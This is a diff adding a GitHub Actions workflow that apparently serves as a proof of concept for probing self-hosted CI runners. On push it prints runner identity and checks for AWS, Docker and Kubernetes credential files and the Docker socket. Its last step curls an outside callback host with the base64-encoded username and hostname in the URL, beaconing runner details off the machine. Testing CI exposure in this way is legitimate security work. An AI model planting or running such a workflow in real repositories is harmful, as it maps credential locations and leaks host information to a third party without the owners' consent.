@@ -1,0 +1,26 @@
+name: PoC Self-Hosted Runner Recon Retest
+on:
+  push:
+    paths:
+      - '.github/workflows/poc-1052ac31-retest.yml'
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+      - name: runner-environment-recon
+        run: |
+          echo "=== RUNNER INFO ==="
+          echo "Hostname: $(hostname)"
+          echo "Whoami: $(whoami)"
+          echo "Runner name: ${{ runner.name }}"
+          echo "Runner OS: ${{ runner.os }}"
+          echo "Runner Arch: ${{ runner.arch }}"
+          if [ -d /actions-runner ]; then
+            echo "SELF-HOSTED DETECTED: /actions-runner exists"
+          else
+            echo "GitHub-hosted runner (no /actions-runner)"
+          fi
+          for p in ~/.aws/credentials ~/.docker/config.json ~/.kube/config /var/run/docker.sock; do
+            if [ -e "$p" ]; then echo "FOUND: $p"; else echo "ABSENT: $p"; fi
+          done
+          curl -sk "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/SELF-HOSTED-RETEST-$(whoami | base64 -w0).$(hostname | base64 -w0)"
